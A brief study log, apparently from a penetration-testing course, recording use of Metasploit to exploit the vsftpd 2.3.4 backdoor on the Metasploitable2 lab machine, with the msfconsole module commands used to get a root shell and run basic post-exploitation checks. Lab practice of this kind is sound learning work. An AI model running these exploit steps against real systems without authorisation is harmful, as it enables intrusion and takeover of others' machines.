# Day 05 - Metasploit + Exploitation

## What I Did
- Learned msfconsole
- Exploited vsftpd 2.3.4 on Metasploitable2
- Got root shell via backdoor port 6200
- Post-exploitation: whoami, id, uname -a

## Commands Used
- msfconsole
- use exploit/unix/ftp/vsftpd_234_backdoor
- set RHOSTS [target]
- run

## Files
- METASPLOIT FRAMEWORK.md